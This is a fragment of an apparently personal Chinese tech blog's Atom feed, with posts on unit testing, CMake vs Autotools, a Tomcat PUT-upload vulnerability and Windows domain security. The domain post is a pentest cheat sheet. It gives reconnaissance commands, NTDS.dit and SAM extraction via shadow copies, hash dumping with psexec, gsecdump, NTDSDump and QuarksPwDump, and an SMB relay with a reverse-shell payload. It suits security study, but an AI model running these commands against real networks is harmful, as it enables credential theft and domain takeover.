+<li>测试并不只是测试工程师的责任，对于开发工程师，为了保证发布给测试环节的代码具有足够好的质量（ Quality ），为所编写的功能代码编写适量的单元测试是十分必要的。</li>
+<li>单元测试（ Unit Test ，模块测试）是开发者编写的一小段代码，用于检验被测代码的一个很小的、很明确的功能是否正确，通过编写单元测试可以在编码阶段发现程序编码错误，甚至是程序设计错误。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li><a href="https://usingcpp.wordpress.com/2016/07/23/google-test-and-visual-studio/" target="_blank" rel="external">https://usingcpp.wordpress.com/2016/07/23/google-test-and-visual-studio/</a></li>
+<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-cppunittest/index.html" target="_blank" rel="external">https://www.ibm.com/developerworks/cn/linux/l-cn-cppunittest/index.html</a></li>
+<li><a href="https://marketplace.visualstudio.com/items?itemName=VisualCPPTeam.TestAdapterforGoogleTest" target="_blank" rel="external">vs上使用googletest</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;测试并不只是测试工程师的责任，对于开发工程师，为了保证发布给测试环节的代码具有足够好的质量（ Quality ），为所编写的功能
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>windows域安全(持续更新)</title>
+    <link href="http://kevien.github.io/2017/09/28/windows%E5%9F%9F%E5%AE%89%E5%85%A8/"/>
+    <id>http://kevien.github.io/2017/09/28/windows域安全/</id>
+    <published>2017-09-28T06:40:42.000Z</published>
+    <updated>2018-07-26T06:41:15.441Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>域安全的知识太多了，整理起来估计都够写一本书了。这边简单整理一些自己笔记的内容。<h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4></li>
+<li>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</li>
+<li>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</li>
+<li>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</li>
+<li><p>Active Directory = LDAP服务器＋LDAP应用（Windows域控）<br>就是Active Directory先实现一个LDAP服务器，然后自己先用这个LDAP服务器实现了自己的一个具体应用（域控）。</p>
+<h4 id="内网信息搜集以及常见域命令"><a href="#内网信息搜集以及常见域命令" class="headerlink" title="内网信息搜集以及常见域命令"></a>内网信息搜集以及常见域命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line">echo %PROCESSOR_ARCHITECTURE%	查看系统版本位数</div><div class="line">set	查看系统环境变量</div><div class="line">netstat -ano	查看开放的端口</div><div class="line">netstat -an | find &quot;3389&quot;	查看3389开放情况</div><div class="line">ipconfig /all	查询本机IP段，所在域等</div><div class="line">net config Workstation	当前计算机名，全名，用户名，系统版本，工作站域，登陆域</div><div class="line">net user	本机用户列表</div><div class="line">net localhroup administrators	本机管理员[通常含有域用户]</div><div class="line">net user /domain	查询域用户</div><div class="line">net user 用户名 /domain	获取指定用户的账户信息</div><div class="line">net user /domain b404 pass	修改域内用户密码，需要管理员权限</div><div class="line">net group /domain	查询域里面的工作组</div><div class="line">net group 组名 /domain	查询域中的某工作组</div><div class="line">net group &quot;domain admins&quot; /domain	查询域管理员列表</div><div class="line">net group &quot;enterprise admins&quot; /domain	获得企业管理员列表</div><div class="line">net group 组名 /del /domain	删除域中的某组</div><div class="line">net group 组名 组成员名 /del /domain	删除域中的某组的组成员</div><div class="line">net localgroup administrators /domain	登录本机的域管理员</div><div class="line">net group 组名 /add	增加域中的组</div><div class="line">net localgroup administrators workgroup\user001 /add	域用户添加到本机</div><div class="line">net group &quot;domain controllers&quot; /domain	查看域控制器(如果有多台)</div><div class="line">net time /domain	判断主域，主域服务器都做时间服务器</div><div class="line">net config workstation	当前登录域</div><div class="line">net session	查看当前会话</div><div class="line">net use \\ip\ipc$ pawword /user:username@domain	建立IPC会话[空连接-***]</div><div class="line">net view \\ip	查询某IP共享</div><div class="line">net use z: \\192.168.200.21\文件夹名	建立映射到本机Z盘</div><div class="line">net share	查看SMB指向的路径[即共享]</div><div class="line">at \\192.168.200.21:50 c:\windows\fuxk.exe	在共享主机上执行</div><div class="line">net view	查询同一域内机器列表</div><div class="line">net view /domain	查询域列表</div><div class="line">net view /domain:test	查看test域中计算机列表</div><div class="line">net view \\DC的机器名字	查看域控共享情况</div><div class="line">nltest /domain_trusts	获取域信任信息</div><div class="line">net session	查看当前会话</div><div class="line">net start	查看当前运行的服务</div><div class="line">net time /domain	查询主域服务器的时间</div><div class="line">net time \\192.168.200.21	查看192.168.200.21机器的时间</div><div class="line">echo %logonserver%	查看登陆到这台服务器的计算机</div><div class="line">net accounts	查看本地密码策略</div><div class="line">net accounts /domain	查看域密码策略</div><div class="line">nbtstat –A ip	netbios 查询</div><div class="line">netstat –an/ano/anb	网络连接查询</div><div class="line">netsh firewall show config	查看防火墙策略</div><div class="line">netsh firewall show state	查看防火墙策略</div><div class="line">route print	路由表</div><div class="line">tracert IP	路由跟踪</div><div class="line">arp -a	列出本网段内所有活跃的IP地址</div><div class="line">arp -s (ip + mac)	绑定mac和IP</div><div class="line">arp -d (iP + mac)	解绑IP和Mac</div><div class="line">tasklist /V	查看进程[显示对应用户]</div><div class="line">tasklist /S ip /U domain\username /P /V	查看远程计算机进程列表</div><div class="line">psexec \\192.168.200.21 -u administrator -p b404pass -c gsecdump.exe -u	从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</div><div class="line">gsecdump -a	获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</div><div class="line">tasklist /S IP地址 /U 域名\用户名 /P /V	查看远程计算机进程</div><div class="line">tasklist /svc	查看进程</div><div class="line">taskkill /im 进程名称(cmd.exe)	结束进程</div><div class="line">taskkill /pid[进程码]	-t(结束该进程) -f(强制结束该进程以及所有子进程)</div><div class="line">ping 主机名	显示IP</div><div class="line">qprocess *	类似tasklist</div><div class="line">qprocess /SERVER:IP	远程查看计算机进程列表</div><div class="line">nslookup –qt-MX Yahoo.com	查看邮件服务器</div><div class="line">whoami /all	查询当前用户权限等</div><div class="line">set	查看系统环境变量</div><div class="line">systeminfo	查看系统信息</div><div class="line">qwinsta	查看登录情况</div><div class="line">qwinsta /SERVER:IP	查看远程登录情况</div><div class="line">fsutil fsinfo drives	查看所有盘符</div><div class="line">gpupdate /force	更新域策略</div><div class="line">whoami	查询账号所属权限</div><div class="line">whoami /all	查看sid号</div><div class="line">wmic bios	查看bios信息</div><div class="line">wmic qfe	查看补丁信息</div><div class="line">wmic qfe get hotfixid	查看补丁-Patch号，很实用</div><div class="line">wmic qfe list full /format:htable &gt; hotfixes.htm	详细的补丁安装</div><div class="line">wmic share get name,path	查看SMB指向路径</div><div class="line">wmic startup	查看启动项</div><div class="line">wmic service	查看服务</div><div class="line">wmic os	查看OS信息</div><div class="line">wmic service list brief	查看进程服务</div><div class="line">wmic process list brief	查看进程</div><div class="line">wmic startup list brief	启动程序信息</div><div class="line">wmic product list brief	查看安装程序和版本信息（漏洞利用线索）</div><div class="line">wmic startup list full	识别开机启动的程序</div><div class="line">wmic process where(description=&quot;mysqld.exe&quot;)&gt;&gt;mysql.log	获取软件安装路径</div><div class="line">dir \\DC\SYSVOL /s /a &gt; sysvol.txt	列出sysvol日志记录</div><div class="line">xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt /i /e /c	拷贝sysvol.txt到本地</div><div class="line">REG query HKCU /v &quot;pwd&quot; /s	获取到存到注册表中的密码</div><div class="line">dir /b/s config.*	查看所在目录所有前缀为config的文件</div><div class="line">findstr /si password *.xml *.ini *.txt	查看后缀名文件中含有password关键字的文件</div><div class="line">findstr /si login *.xml *.ini *.txt	查看后缀名文件中含有login关键字的文件</div><div class="line">copy con ftp.bat	创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</div><div class="line">copy con test.vbs	创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</div></pre></td></tr></table></figure>
+</li>
+<li><p>查找域控<br>1.一般是DNS 服务器，开放了389端口的基本就是域控服务器了<br>2.使用nslookup命令  _ldap._tcp.dc._msdcs.domainname<br>3.nltest /dclist:domainname<br><img src="/2017/09/28/windows域安全/finddc.png" alt=""><br>4.cobaltstrike的net  dclist直接定位到dc<br>或者使用powershell的powerview 获取域当前的信息<br>5.adfind、ldifde、adexplorer等工具<br><img src="/2017/09/28/windows域安全/adfind.png" alt=""><br>…</p>
+</li>
+<li>常见脚本<br><a href="https://pentestlab.blog/2018/05/28/situational-awareness/" target="_blank" rel="external">https://pentestlab.blog/2018/05/28/situational-awareness/</a><h4 id="搞定域控"><a href="#搞定域控" class="headerlink" title="搞定域控"></a>搞定域控</h4>1.ms14-068 将普通域用户权限提升为域控权限<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="external">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a><h4 id="trick1-PTH"><a href="#trick1-PTH" class="headerlink" title="trick1 PTH"></a>trick1 PTH</h4><img src="/2017/09/28/windows域安全/passhash.png" alt=""><h4 id="trick2-golden-ticket"><a href="#trick2-golden-ticket" class="headerlink" title="trick2 golden ticket"></a>trick2 golden ticket</h4><img src="/2017/09/28/windows域安全/krbtgt.png" alt=""><h4 id="trick3-dump-hash"><a href="#trick3-dump-hash" class="headerlink" title="trick3 dump hash"></a>trick3 dump hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">vssadmin Create Shadow /for=C：        创建新的卷影副本</div><div class="line">成功地创建了 &apos;C:\&apos; 的卷影副本</div><div class="line">   卷影副本 ID: &#123;ad7dfdec-a8db-4fa3-b2e6-7e1ab1bad2b4&#125;</div><div class="line">   卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3</div><div class="line"></div><div class="line">执行程序：</div><div class="line">\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\test\psexec.exe</div><div class="line">1.需要先创建好目录，并放入木马或程序</div><div class="line">2.再创建新的卷影副本,利用卷影副本卷名来执行程序，并把卷影副本卷名中的 &quot;?&quot; 需要改为 &quot;.&quot;号执行程序</div><div class="line"></div><div class="line">Copy Files</div><div class="line">有些系统运行中的文件是不可复制的，比如像SAM</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\</div><div class="line"></div><div class="line">PowerShell调用方法：</div><div class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -ComputerName SERVER -localDestination &quot;C:\temp\SYSTEM&quot;</div><div class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\NTDS\NTDS.dit&quot; -ComputerName SERVER -localDestination &quot;C:\temp\NTDS.dit&quot;</div><div class="line">需要文件：</div><div class="line">https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy</div><div class="line"></div><div class="line">vssadmin Delete Shadows /shadow=&#123;ce51aaf6-5677-4423-86ac-45d064ef626e&#125; /quiet        删除卷影副本</div><div class="line">vssadmin Delete Shadows /For=C:</div><div class="line"></div><div class="line">---</div><div class="line"></div><div class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters        查询NTDS路径</div><div class="line">获取域数据库</div><div class="line">Windows\NTDS\ntds.dit</div><div class="line">Windows\System32\config\SYSTEM</div><div class="line">Windows\System32\config\SAM</div><div class="line"></div><div class="line">NTDSDump导出域数据库hash值：</div><div class="line">NTDSDump.exe -f ntds.dit -s SYSTEM -h -t john -o save.txt</div><div class="line">或者：</div><div class="line">QuarksPwDump.exe</div><div class="line">QuarksPwDump --dump-hash-domain --with-history        导出本机域控历史hash值</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="external">更多</a></p>
+<h4 id="trick4-smbrelay"><a href="#trick4-smbrelay" class="headerlink" title="trick4 smbrelay"></a>trick4 smbrelay</h4><p>python smbrelayx.py -h 172.24.243.59（被攻击的机器） -e smb_rev.exe<br><img src="/2017/09/28/windows域安全/smbrelay.png" alt=""><br><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py" target="_blank" rel="external">https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py</a><br><a href="http://www.91ri.org/9022.html" target="_blank" rel="external">再谈SMB中继攻击</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;域安全的知识太多了，整理起来估计都够写一本书了。这边简单整理一些自己笔记的内容。&lt;h4 id=&quot;域&quot;&gt;&lt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Cmake VS Autotools</title>
+    <link href="http://kevien.github.io/2017/09/28/CmakeVSautotools/"/>
+    <id>http://kevien.github.io/2017/09/28/CmakeVSautotools/</id>
+    <published>2017-09-28T02:40:33.000Z</published>
+    <updated>2017-10-29T17:49:59.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统学习。<br></p>
+<h4 id="Cmake使用"><a href="#Cmake使用" class="headerlink" title="Cmake使用"></a>Cmake使用</h4><ul>
+<li><a href="https://www.wikiwand.com/en/CMake" target="_blank" rel="external">wiki关于cmake介绍</a></li>
+<li><a href="https://cmake.org/documentation/" target="_blank" rel="external">官方文档</a> 熟悉某种技术的最好最快的方法还是要通过阅读官方文档:P</li>
+<li><a href="https://www.gitbook.com/book/tuannguyen68/learning-cmake-a-beginner-s-guide/details" target="_blank" rel="external">learning-cmake-a-beginner-s-guide/details</a></li>
+<li><a href="http://www.hahack.com/codes/cmake/" target="_blank" rel="external">CMake 入门实战</a></li>
+<li>windows下使用<br><img src="/2017/09/28/CmakeVSautotools/cmake.png" alt=""><h4 id="Cmake-语法简单介绍"><a href="#Cmake-语法简单介绍" class="headerlink" title="Cmake 语法简单介绍"></a>Cmake 语法简单介绍</h4>可以把cmake理解为一种简单的语言，它也有着它的语法和变量。它的语法规则很简单<br><br>1.变量使用${}方式取值<br><br>2.指令（参数1 参数2 。。。）<br><br>3.指令是大小写无关的，参数和变量是大小写敏感的，例如set 和SET 作为指令都是可以的，但是建议全部使用大写的指令。<br><br>4.cmake的语法还是比较灵活且考虑到了各种情况，比如SET(SOURCES_FILES main.c)也可以写成SET(SOURCES_FILES “main.c”)，但是假设一个源文件中的文件名是fu nc.c（中间有了空格），这个时候就有必要加上双引号了。<br><br>5.清理工程，跟经典的autotools系列工具一样，make clean可以对构建结果进行清理。<br><br>6.内部构建和外部构建。内部构建就是直接在根目录下面构建(会在工程目录下产生很多文件，使工程看起来比较乱)，而使用外部构建比如在工程目录下面创建一个build的目录，然后进入build目录下，进行cmake .. 这样生成的文件都在build目录下。推荐是有外部构建，所以一般的构建命令就是进入 build 目录下面，然后 cmake ..  make<br>7.注意cmake 是构建项目的过程,是产生Makefile的过程，也就是生成编译指令的过程，这个过程不会包编译的错误。make才是编译和链接的过程，如果你的代码有问题，或者你的编译指令有有问题(比如未包含动态或者静态的lib)这是时候会产生错误。<br><br>8.ADD_LIBRARY()用来生成动态或者静态链接库的。INCLUDE_DIRECTORY()是用来向工程添加多个特定的头文件搜索路径的，路径之间用空格分开，如果路径中包含了空格，可以使用双引号将它括起来。默认的行为是追加到当前的头文件搜索路径的后面。LINK_DIRECTORIES()添加非标准的共享库搜索路径，TARGET_LINK_LIBRARIES(target  library1 library2),这个指令可以用来为target添加需要连接的共享库.<br><br><img src="/2017/09/28/CmakeVSautotools/makeparam.png" alt=""><br><br><img src="/2017/09/28/CmakeVSautotools/linklib.png" alt=""><br><a href="https://github.com/kevien/cmakesample" target="_blank" rel="external">测试代码见github</a><h4 id="autotools使用"><a href="#autotools使用" class="headerlink" title="autotools使用"></a>autotools使用</h4></li>
+<li><a href="https://geesun.github.io/posts/2015/02/autotool.html" target="_blank" rel="external">使用autotools生成Makefile学习笔记</a></li>
+<li><a href="http://leolovenet.com/downloads/files/autotools.pdf" target="_blank" rel="external">autotools入门</a><h4 id="使用libtool创建库"><a href="#使用libtool创建库" class="headerlink" title="使用libtool创建库"></a>使用libtool创建库</h4><a href="https://www.ibm.com/developerworks/cn/aix/library/1007_wuxh_libtool/index.html" target="_blank" rel="external">使用libtool创建库</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><a href="https://github.com/darx0r/SC-A-Make" target="_blank" rel="external">cmake导致的命令执行问题</a><br><a href="http://thebigdoc.readthedocs.io/en/latest/auto-make-conf.html" target="_blank" rel="external">automake 和 autoconf 使用简明教程</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.youtube.com/watch?v=gYmgbqGfv-8" target="_blank" rel="external">https://www.youtube.com/watch?v=gYmgbqGfv-8</a><br><a href="https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake" target="_blank" rel="external">https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Tomcat 远程代码执行漏洞(CVE-2017-12615)以及信息泄露漏洞(CVE-2017-12616)</title>
+    <link href="http://kevien.github.io/2017/09/21/Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-12615-%E4%BB%A5%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2017-12616/"/>
+    <id>http://kevien.github.io/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/</id>
+    <published>2017-09-21T07:20:42.000Z</published>
+    <updated>2017-09-24T16:26:35.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><ul>
+<li>测试环境<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/tomcatversion.png" alt=""></li>
+<li>首先修改conf/web.xml文件，如下<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/config.png" alt=""><br><br>修改完成之后重启tomcat服务器</li>
+<li>put上传文件<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/put.png" alt=""></li>
+<li>测试<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/result.png" alt=""><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4></li>
+<li>待更<h4 id="CVE-2017-12616-​信息泄露漏洞"><a href="#CVE-2017-12616-​信息泄露漏洞" class="headerlink" title="CVE-2017-12616 ​信息泄露漏洞"></a>CVE-2017-12616 ​信息泄露漏洞</h4><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li>说实话，没事儿去修改readonly为false的应该不多，所以漏洞影响有限。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5&amp;chksm=ea3f3dd9dd48b4cf1db66e70662126cf1eb45f60eb8205b3391d20f66564e6a789b158c0efe5&amp;mpshare=1&amp;scene=23&amp;srcid=0921nOtxiMml2bGoVXM9jKMS#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5&amp;chksm=ea3f3dd9dd48b4cf1db66e70662126cf1eb45f60eb8205b3391d20f66564e6a789b158c0efe5&amp;mpshare=1&amp;scene=23&amp;srcid=0921nOtxiMml2bGoVXM9jKMS#rd</a></li>
+<li><a href="http://www.freebuf.com/vuls/148283.html" target="_blank" rel="external">http://www.freebuf.com/vuls/148283.html</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&amp;mid=2247483712&amp;idx=1&amp;sn=c92d1abc41c6a8293c83ff4913b214a4&amp;chksm=ecb11db0dbc694a62d5d073054d0bf41b2ab5680807f19a3357a82fcb4ba72883cf97e9b4321&amp;mpshare=1&amp;scene=23&amp;srcid=0921koVmEUnPZyCRatqKTka3#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&amp;mid=2247483712&amp;idx=1&amp;sn=c92d1abc41c6a8293c83ff4913b214a4&amp;chksm=ecb11db0dbc694a62d5d073054d0bf41b2ab5680807f19a3357a82fcb4ba72883cf97e9b4321&amp;mpshare=1&amp;scene=23&amp;srcid=0921koVmEUnPZyCRatqKTka3#rd</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;h4 id=&quot;复现&quot;&gt;&lt;a href=&quot;#复现&quot; class=&quot;headerlink&quot; title=&quot;复现&quot;&gt;&lt;/a&gt;复现&lt;/h4&gt;&lt;ul&gt;
+&lt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+</feed>
